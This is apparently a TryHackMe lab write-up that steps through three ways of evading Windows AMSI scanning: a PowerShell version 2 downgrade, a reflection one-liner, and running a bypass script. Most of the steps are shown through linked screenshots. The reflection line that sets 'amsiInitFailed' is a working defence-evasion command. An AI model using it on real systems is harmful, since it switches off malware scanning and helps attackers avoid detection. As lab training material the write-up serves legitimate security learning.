
# PowerShell Downgrade

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Downgrade%20pt0.png)

```PowerShell
C:\Users\THM-Attacker>PowerShell -Version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Downgrade%20pt1.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Downgrade%20pt2.png)

# PowerShell Reflection

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Reflection%20pt1.png)

```PowerShell
PS C:\Users\THM-Attacker> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Reflection%20pt2.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Reflection%20pt3.png)

# Patching AMSI

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Patching%20AMSI%20pt1.png)

```PowerShell
C:\Users\THM-Attacker>cd Desktop
```

```PowerShell
C:\Users\THM-Attacker\Desktop>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

```PowerShell
PS C:\Users\THM-Attacker\Desktop> .\bypass.ps1
True
```

![]https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Patching%20AMSI%20pt2.png()

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Patching%20AMSI%20pt3.png)
